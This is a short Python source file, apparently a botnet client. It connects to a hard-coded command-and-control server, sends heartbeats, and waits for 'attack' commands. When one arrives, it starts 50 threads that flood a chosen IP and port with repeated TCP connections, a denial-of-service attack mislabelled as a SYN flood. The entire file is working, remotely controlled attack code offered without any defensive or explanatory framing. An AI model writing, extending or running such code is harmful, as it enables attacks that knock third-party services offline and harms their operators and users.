# bot_client.py
import socket, threading, time, random
import os

CNC_IP = "192.168.0.100"
CNC_PORT = 9001

def send_heartbeat(sock):
    while True:
        try:
            sock.send(b"heartbeat")
        except:
            break
        time.sleep(3)

def syn_flood(target_ip, target_port):
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            s.close()
    except:
        pass

def handle_command(sock):
    while True:
        try:
            data = sock.recv(1024).decode()
            if data.startswith("attack"):
                _, method, ip, port = data.split()
                port = int(port)
                if method == "syn":
                    for _ in range(50):  # 쓰레드 수
                        threading.Thread(target=syn_flood, args=(ip, port), daemon=True).start()
        except:
            break

def connect_to_cnc():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((CNC_IP, CNC_PORT))
            sock.send(b"hello")
            threading.Thread(target=send_heartbeat, args=(sock,), daemon=True).start()
            handle_command(sock)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    connect_to_cnc()
